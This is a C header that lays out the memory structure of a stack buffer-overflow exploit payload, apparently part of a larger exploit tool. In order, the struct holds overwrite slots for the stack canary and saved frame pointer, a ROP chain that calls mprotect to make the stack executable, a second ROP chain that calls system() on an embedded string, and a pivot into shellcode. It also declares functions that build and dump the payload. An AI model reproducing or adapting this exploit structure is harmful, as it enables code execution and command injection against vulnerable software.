#ifndef _PAYLOAD_H_
#define _PAYLOAD_H_
#include "addresses.h"
#include "shellcode.h"

typedef struct Payload {
        // Stack frame contents at lower addresses than the RET data
	AddressUnion	pl_dst;
	AddressUnion	pl_canary;
	AddressUnion	pl_rbp;

        // THE OVERFLOW FUNCTION WILL RETURN TO THE NEXT VARIABLE IN THIS STRUCTURE

        // ROP chain for "mprotect(ps_stackPage, pl_stackSize, pl_permission)"
	AddressUnion	pl_popRDI;
	AddressUnion	pl_stackPage;
	AddressUnion	pl_popRSI;
	ptrdiff_t	pl_stackSize;
	AddressUnion	pl_popRDX;
	long		pl_permission;
	AddressUnion	pl_mprotect;

        // ROP chain for "system(pl_bss)"
        AddressUnion    pl_popRDI2;
        AddressUnion    pl_systemArg;
        AddressUnion    pl_popRAX;
        long            pl_zero;
        AddressUnion    pl_system;

	// Stack pivot to executable code (&pl_scu)
        AddressUnion    pl_shellCode;

	// Freedom!
	ShellcodeUnion	pl_scu;

        // Extra space in the payload for string storage
        char            pl_bss[64];
} Payload, *PayloadPtr;

extern void	initload(PayloadPtr plp);
extern ssize_t	makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np);
extern void	dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr);

#endif
